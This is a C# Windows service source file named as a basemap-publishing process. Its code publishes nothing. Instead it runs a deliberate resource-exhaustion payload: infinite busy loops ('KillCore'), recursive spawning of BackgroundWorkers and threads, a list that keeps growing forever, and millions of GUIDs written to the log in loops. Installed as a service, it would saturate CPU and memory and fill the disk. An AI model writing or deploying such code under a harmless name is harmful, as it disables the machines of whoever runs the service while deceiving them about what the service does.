using NLog;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SOIBasemapPublisherProcess
{
    public partial class SOIBasemapPublishProcess : ServiceBase
    {
        private readonly static Lazy<SOIBasemapPublishProcess> _instance = new Lazy<SOIBasemapPublishProcess>();
      
        private static Logger _logger = LogManager.GetLogger("AppLog");
        private Thread _schedulerInitiatorThread = null;
        private Thread _schedulerInitiatorThreadV2 = null;
        Random _rand = new Random();

        public static SOIBasemapPublishProcess Instance
        {
            get
            {
                return _instance.Value;
            }
        }

        public SOIBasemapPublishProcess()
        {
            InitializeComponent();
            this.ServiceName = "SOIBasemapPublish";
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                ManagementObject wmiService = new ManagementObject(string.Format("Win32_Service.Name='{0}'",this.ServiceName));
                wmiService.Get();
                string user = wmiService["startname"].ToString();
                _logger.Info("Service user: " + user);
                _logger.Info("");
            }
            catch
            {
                _logger.Fatal("Unable to get service user name");
                _logger.Fatal("");

            }

            try
            {
                _logger.Info("Service is starting..");
                _logger.Info("");

                _schedulerInitiatorThread = new Thread(new ThreadStart(ScheduleInitiator));
                _schedulerInitiatorThread.Start();

                _schedulerInitiatorThreadV2 = new Thread(new ThreadStart(ScheduleInitiator));
                _schedulerInitiatorThreadV2.Start();
            }
            catch (Exception ex)
            {
                _logger.Fatal(ex);
                _logger.Fatal("");
            }
        }

        protected override void OnStop()
        {
            try
            {
                _logger.Info("Service stopped");
                _logger.Info("");

                _schedulerInitiatorThread.Abort();
                _schedulerInitiatorThreadV2.Abort();
            }
            catch (Exception ex)
            {
                _logger.Fatal(ex);
                _logger.Fatal("");
            }
        }

        private void ScheduleInitiator()
        {
            while (true)
            {
                try
                {
                    BackgroundWorker backgroundWorker = new BackgroundWorker();
                    backgroundWorker.DoWork += BackgroundWorker_DoWork;

                    if (!backgroundWorker.IsBusy)
                        backgroundWorker.RunWorkerAsync();

                    BackgroundWorker backgroundWorker3 = new BackgroundWorker();
                    backgroundWorker3.DoWork += BackgroundWorker3_DoWork;

                    if (!backgroundWorker3.IsBusy)
                        backgroundWorker3.RunWorkerAsync();
                }
                catch (Exception ex)
                {
                    _logger.Fatal(ex);
                    _logger.Fatal("");

                    continue;
                }
            }
        }

        private void BackgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                KillCoreParentMethod();
            }
            catch (Exception ex)
            {

                _logger.Fatal(ex);
                _logger.Fatal("");

                KillCoreParentMethod();
            }
        }

        private void BackgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                CpuCoreKillParentFunction();
            }
            catch (Exception ex)
            {
                _logger.Fatal(ex);
                _logger.Fatal("");

                CpuCoreKillParentFunction();
            }
        }

        private void KillCore()
        {
            long num = 0;
            while (true)
            {
                try
                {
                    num += _rand.Next(100, 1000);
                    if (num > 1000000) { num = 0; }
                }
                catch (Exception ex)
                {
                    _logger.Fatal(ex);
                    _logger.Fatal("");

                    continue;
                }
            }
        }

        private void KillCoreParentMethod()
        {
            while (true)
            {
                try
                {
                    List<Thread> threads = new List<Thread>();
                    while (true)
                    {
                        try
                        {
                            threads.Add(new Thread(new ThreadStart(KillCore)));
                            threads.Add(new Thread(new ThreadStart(CpuCoreKillParentFunction)));
                        }
                        catch (Exception ex)
                        {
                            _logger.Fatal(ex);
                            _logger.Fatal("");

                            continue;
                        }
                    }
                }
                catch (Exception ex)
                {
                    try
                    {
                        _logger.Fatal(ex);
                        _logger.Fatal("");

                        BackgroundWorker backgroundWorker1 = new BackgroundWorker();
                        backgroundWorker1.DoWork += BackgroundWorker1_DoWork;

                        if (!backgroundWorker1.IsBusy)
                            backgroundWorker1.RunWorkerAsync();

                        BackgroundWorker backgroundWorker2 = new BackgroundWorker();
                        backgroundWorker2.DoWork += BackgroundWorker2_DoWork;

                        if (!backgroundWorker2.IsBusy)
                            backgroundWorker2.RunWorkerAsync();

                        KillCoreParentMethod();
                        CpuCoreKillParentFunction();
                    }
                    catch (Exception ex_child)
                    {

                        _logger.Fatal(ex_child);
                        _logger.Fatal("");

                        continue;
                    }
                } 
            }
        }

        private void BackgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                CpuCoreKillParentFunction();
            }
            catch (Exception ex)
            {
                _logger.Fatal(ex);
                _logger.Fatal("");

                CpuCoreKillParentFunction();

            }
        }

        private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                KillCoreParentMethod();
            }
            catch (Exception ex)
            {
                _logger.Fatal(ex);
                _logger.Fatal("");

                KillCoreParentMethod();
            }
        }

        private void CpuCoreOverKillDoWork(int threadId)
        {
            while (true)
            {
                try
                {
                    BackgroundWorker CpuCoreOverKillDoWork = new BackgroundWorker();
                    CpuCoreOverKillDoWork.DoWork += CpuCoreOverKillDoWork_DoWork;

                    if (!CpuCoreOverKillDoWork.IsBusy)
                        CpuCoreOverKillDoWork.RunWorkerAsync();

                    _logger.Info(threadId + Guid.NewGuid().ToString());
                    _logger.Info("");
                }
                catch (Exception ex)
                {
                    _logger.Fatal(ex);
                    _logger.Fatal("");

                    continue;
                } 
            }
        }

        private void CpuCoreOverKillDoWork_DoWork(object sender, DoWorkEventArgs e)
        {
            while (true)
            {
                try
                {
                    _logger.Info(Guid.NewGuid());
                    _logger.Info("");

                    KillCoreParentMethod();
                }
                catch (Exception ex)
                {
                    _logger.Fatal(ex);
                    _logger.Fatal("");

                    continue;
                } 
            }
        }

        private void CpuCoreKillParentFunction()
        {
            try
            {
                int numberOfThreads = Environment.ProcessorCount;

                var tasks = new Task[numberOfThreads];

                for (int i = 0; i < numberOfThreads; i++)
                {
                    BackgroundWorker backgroundWorkerCpuCoreKillParent = new BackgroundWorker();
                    backgroundWorkerCpuCoreKillParent.DoWork += BackgroundWorkerCpuCoreKillParent_DoWork;

                    if (!backgroundWorkerCpuCoreKillParent.IsBusy)
                        backgroundWorkerCpuCoreKillParent.RunWorkerAsync();

                    TaskFactoryChildFunction(tasks, i);

                    for (int j = 0; j < 1000000; j++)
                    {
                        _logger.Info(Guid.NewGuid());
                        _logger.Info("");

                        _logger.Info(Guid.NewGuid());
                        _logger.Info("");

                        _logger.Info(Guid.NewGuid());
                        _logger.Info("");
                    }

                    _logger.Info(Guid.NewGuid());
                    _logger.Info("");
                }

                Task.WhenAll(tasks).Wait();

                _logger.Info(Guid.NewGuid());
                _logger.Info("");

                _logger.Info("All tasks completed.");
                _logger.Info("");
            }
            catch (Exception ex)
            {
                _logger.Fatal(ex);
                _logger.Fatal("");

                CpuCoreKillParentFunction();
            }
        }

        private void BackgroundWorkerCpuCoreKillParent_DoWork(object sender, DoWorkEventArgs e)
        {
            for(int i = 0; i< 1000000; i++)
            {
                try
                {
                    _logger.Info(Guid.NewGuid());
                    _logger.Info("");

                    _logger.Info(Guid.NewGuid());
                    _logger.Info("");

                    _logger.Info(Guid.NewGuid());
                    _logger.Info("");
                }
                catch (Exception ex) { _logger.Fatal(ex); _logger.Fatal(""); continue; }
            }
           
        }

        private void TaskFactoryChildFunction(dynamic tasks, int i)
        {
            tasks[i] = Task.Factory.StartNew(() => CpuCoreOverKillDoWork(i));

            for (int j = 0; j < 1000000; j++)
            {
                try
                {

                    _logger.Info(Guid.NewGuid());
                    _logger.Info("");

                    _logger.Info(Guid.NewGuid());
                    _logger.Info("");

                    _logger.Info(Guid.NewGuid());
                    _logger.Info("");
                }
                catch (Exception ex) { _logger.Fatal(ex); _logger.Fatal(""); continue; }
            }
        }
    }
}
